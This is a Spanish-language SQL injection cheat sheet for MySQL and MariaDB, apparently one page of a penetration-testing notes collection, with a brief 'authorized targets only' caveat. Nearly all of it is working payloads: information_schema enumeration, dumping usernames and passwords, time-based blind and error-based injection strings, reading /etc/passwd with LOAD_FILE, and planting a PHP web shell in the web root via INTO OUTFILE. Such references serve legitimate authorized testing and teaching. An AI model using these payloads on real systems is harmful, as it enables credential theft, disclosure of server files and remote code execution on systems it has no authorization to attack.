# SQLi — MySQL / MariaDB

Ver índice: [sqli.md](sqli.md). Payloads en `../../04-cheatsheets/por-vuln/sqli.md`. **Solo sobre objetivos autorizados.**

## Comentarios

```
-- -      #      /* */
```

## Info básica

```sql
SELECT version();        -- versión
SELECT database();       -- BD actual
SELECT current_user();   -- usuario
SELECT @@version;
```

## Concatenación

```sql
CONCAT(a,b)      CONCAT_WS(':',a,b)      GROUP_CONCAT(col)
```

## Enumeración del esquema (information_schema)

```sql
-- bases de datos
SELECT schema_name FROM information_schema.schemata;
-- tablas
SELECT table_name FROM information_schema.tables WHERE table_schema=database();
-- columnas
SELECT column_name FROM information_schema.columns WHERE table_name='users';
-- volcar
SELECT GROUP_CONCAT(username,0x3a,password) FROM users;
```

## Blind — time-based

```sql
' AND SLEEP(5)-- -
' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)-- -
```

## Error-based

```sql
' AND extractvalue(1,concat(0x7e,version()))-- -
' AND updatexml(1,concat(0x7e,(SELECT database())),1)-- -
```

## Lectura/escritura de ficheros (requiere privilegios / FILE)

```sql
SELECT LOAD_FILE('/etc/passwd');
... UNION SELECT "<?php system($_GET['c']);?>" INTO OUTFILE '/var/www/html/s.php'-- -
```

## Notas

- MySQL **no** permite stacked queries por defecto desde muchos drivers.
- `0x...` (hex) evita comillas en cadenas.
